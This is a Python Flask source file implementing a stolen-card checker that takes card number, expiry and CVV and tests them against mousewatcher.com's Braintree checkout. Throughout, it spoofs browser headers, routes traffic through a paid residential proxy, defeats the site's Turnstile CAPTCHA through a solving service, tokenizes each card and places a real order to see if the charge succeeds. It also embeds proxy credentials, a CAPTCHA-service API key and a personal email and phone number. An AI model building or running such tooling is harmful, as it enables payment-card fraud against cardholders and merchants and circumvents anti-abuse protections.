from flask import Flask, request, jsonify
import re
import json
import base64
import time
import os
import logging
from datetime import datetime, timedelta
import httpx
from fake_useragent import UserAgent

app = Flask(__name__)

LOG_FILE = '/tmp/requests_log.txt'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

PROXY_URL = "http://gw.dataimpulse.com:823"
PROXY_USER = "fefba219d9470e2f3e9f"
PROXY_PASS = "7c4d77b9baa8a6eb"

proxies = {
    "http://": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_URL}",
    "https://": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_URL}",
}

ua = UserAgent()

def log_response(step, response, card_last4=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"""
{'='*60}
[{timestamp}] STEP: {step} | CARD: {card_last4}
{'='*60}
STATUS: {response.status_code}
URL: {str(response.url)}
BODY: {response.text[:1000]}
{'='*60}
"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except:
        pass
    logging.info(f"Step '{step}' logged for card ending in {card_last4}")

CAPSOLVER_API_KEY = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')

def get_dates():
    today = datetime.now()
    dates = []
    for i in range(7):
        date = today + timedelta(days=i)
        dates.append(date.strftime("%Y-%m-%d"))
    return dates

def solve_turnstile():
    logging.info("Starting Turnstile solving...")
    
    create_payload = {
        "clientKey": CAPSOLVER_API_KEY,
        "task": {
            "type": "AntiTurnstileTaskProxyLess",
            "websiteURL": "https://mousewatcher.com/orders",
            "websiteKey": "0x4AAAAAAAZeM8EG-HBKlL4B",
            "metadata": {"action": "order"}
        }
    }
    
    with httpx.Client(proxies=proxies, timeout=30.0) as client:
        response = client.post("https://api.capsolver.com/createTask", json=create_payload)
        result = response.json()
    
    if result.get("errorId"):
        raise Exception(f"Task creation failed: {result.get('errorDescription', 'Unknown error')}")
    
    task_id = result.get("taskId")
    logging.info(f"Task created: {task_id}")
    
    for i in range(30):
        time.sleep(2)
        get_payload = {
            "clientKey": CAPSOLVER_API_KEY,
            "taskId": task_id
        }
        with httpx.Client(proxies=proxies, timeout=30.0) as client:
            response = client.post("https://api.capsolver.com/getTaskResult", json=get_payload)
            result = response.json()
        
        if result.get("status") == "ready":
            token = result.get("solution", {}).get("token")
            logging.info("Turnstile solved successfully")
            return token
        elif result.get("status") == "failed":
            raise Exception(f"Task failed: {result.get('errorDescription', 'Unknown error')}")
        
        logging.info(f"Waiting for solution... Attempt {i+1}/30")
    
    raise Exception("Timeout waiting for captcha solution")

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'POST or GET with cc parameter',
            '/logs': 'GET - View recent logs',
            '/date': 'GET - Show current date being used',
            'example': '/check?cc=4111111111111111|12|26|123'
        }
    })

@app.route('/date', methods=['GET'])
def show_date():
    dates = get_dates()
    return jsonify({
        'today': datetime.now().strftime("%Y-%m-%d"),
        'dates_used': dates,
        'timezone': str(datetime.now().astimezone().tzinfo)
    })

@app.route('/logs', methods=['GET'])
def view_logs():
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            recent = lines[-50:] if len(lines) > 50 else lines
            return jsonify({'logs': ''.join(recent)}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    try:
        if request.method == 'GET':
            fullz = request.args.get('cc')
        else:
            data = request.get_json()
            fullz = data.get('cc') if data else request.form.get('cc')
        
        if not fullz:
            return jsonify({'error': 'CC required. Format: CC|MM|YY|CVV', 'example': '4111111111111111|12|26|123'}), 400
        
        cc, mes, ano, cvv = fullz.split("|")
        card_last4 = cc[-4:]
        
        dates = get_dates()
        today_date = dates[0]
        
        logging.info(f"Processing card ending in {card_last4} for date {today_date}")

        
        
        with httpx.Client(proxies=proxies, timeout=30.0, follow_redirects=True) as client:
            chrome_headers = {
                'User-Agent': ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.google.com',
                'Referer': 'https://www.google.com/',
                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Upgrade-Insecure-Requests': '1',
            }
            
            response = client.get('https://mousewatcher.com', headers=chrome_headers)
            log_response("GET_CSRF_TOKEN", response, card_last4)
            
            csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
            if not csrf_match:
                raise Exception("CSRF token not found")
            csrf_token = csrf_match.group(1)
            logging.info(f"CSRF token obtained")
            
            totals_headers = {
                **chrome_headers,
                'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://mousewatcher.com',
                'Referer': 'https://mousewatcher.com/',
            }
            
            response = client.post('https://mousewatcher.com/orders/totals', headers=totals_headers, json={'dates': [today_date]})
            log_response("POST_TOTALS", response, card_last4)
            
            token_headers = {
                **chrome_headers,
                'Accept': 'application/json',
                'Origin': 'https://mousewatcher.com',
                'Referer': 'https://mousewatcher.com/',
            }
            
            response = client.get('https://mousewatcher.com/orders/tokens', headers=token_headers)
            log_response("GET_BRAINTREE_TOKEN", response, card_last4)
            
            if not response.text:
                raise Exception("Empty response from tokens endpoint")
            
            jwt_token = response.json().get('braintree_token')
            if not jwt_token:
                raise Exception("Braintree token not found")
                
            decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
            auth = decoded['authorizationFingerprint']
            logging.info(f"Braintree auth obtained")
            
            tokenize_headers = {
                'User-Agent': chrome_headers['User-Agent'],
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {auth}',
                'Braintree-Version': '2018-05-10',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': '38cfe742-91d5-4963-be3c-825f72b84fec',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {'postalCode': '10001'},
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = client.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data)
            log_response("TOKENIZE_CARD", response, card_last4)
            
            response_json = response.json()
            if 'data' not in response_json or not response_json['data'].get('tokenizeCreditCard'):
                error_msg = response_json.get('errors', [{}])[0].get('message', 'Unknown error')
                raise Exception(f"Tokenization failed: {error_msg}")
            
            tkn = response_json['data']['tokenizeCreditCard']['token']
            logging.info(f"Card tokenized successfully")
            
            turnstile_token = solve_turnstile()
            
            post_data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]={today_date}&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
            
            submit_headers = {
                **chrome_headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://mousewatcher.com',
                'Referer': 'https://mousewatcher.com/',
            }
            
            response = client.post('https://mousewatcher.com/orders', headers=submit_headers, data=post_data)
            log_response("SUBMIT_ORDER", response, card_last4)
            
            if '<div id="error_explanation">' in response.text:
                error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
                error = error_match.group(1).strip() if error_match else 'Unknown error'
                logging.warning(f"Order failed: {error}")
                return jsonify({'status': 'failed', 'error': error, 'card': card_last4, 'date_used': today_date}), 200
            
            logging.info(f"SUCCESS! Card {card_last4} processed")
            return jsonify({
                'status': 'success',
                'message': 'Order placed successfully',
                'card': card_last4,
                'date_used': today_date,
                'token': tkn
            }), 200
        
    except Exception as e:
        logging.error(f"Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
